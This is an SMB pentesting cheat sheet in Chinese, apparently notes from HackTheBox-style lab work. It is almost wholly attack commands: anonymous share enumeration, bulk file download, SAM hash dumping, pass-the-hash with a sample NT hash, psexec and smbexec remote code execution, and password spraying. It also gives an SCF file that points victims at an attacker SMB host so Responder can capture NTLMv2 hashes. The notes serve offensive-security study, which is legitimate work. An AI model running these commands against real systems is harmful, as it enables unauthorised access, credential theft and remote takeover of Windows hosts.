>[!info ]
>- TCP/139 、TCP/445
>- UDP/137、UDP/138 

 - 匿名登入
```shell
 smbclient -N -L //10.129.14.128
```

## 列舉
```
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```
### 列出登入用戶
```shell
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```
- 抓取hash
```shell
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```
- PassTheHash
```shell
 crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```
###  列舉工具
- smbmap 
```shell
smbmap -H 10.129.14.128
```
```shell
smbmap -H 10.129.14.128 -r notes
```
```shell
smbmap -H 10.129.14.128 --download "notes\note.txt"
```
```shell
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```
- enum4linux-ng
```shell
 ./enum4linux-ng.py 10.10.11.45 -A -C
```
-  CrackMapExec 
>[!warning ] 小節重點
當需要知道所有資料夾裡面有甚麼東西的時候使用，spider_plur模組會自動幫你抓一遍
```
crackmapexec smb 10.10.10.182 -u "r.thompson" -p 'rY4n5eva' -M spider_plus
```
### 當因為檔案太大，導致無法下載

```
sudo mount -t cifs -o 'username=audit2020,password=password123@' //10.10.10.192/forensic /home/kali/Desktop/HTB/blackfield
```
## RCE 
- Impacket-psexec 
```shell
impacket-psexec administrator:'Password123!'@10.10.110.17
```
- crackmapexec
```shell
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```

## 攻擊手法 
>[!warning ] 小節重點
>手法不多，但是可以參考
### SMB Share – SCF File Attacks
如果有人在smb裡面點擊的話，可以讓她點scf，因為可以讓她存取.ico檔案，就有機會可以讀到NTLMv2
- file.scf
```
[Shell]
Command=2
IconFile=\\X.X.X.X\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```
- responder
```
sudo responder -I tun0
```
### 暴力破解SMB 
```shell
crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
```
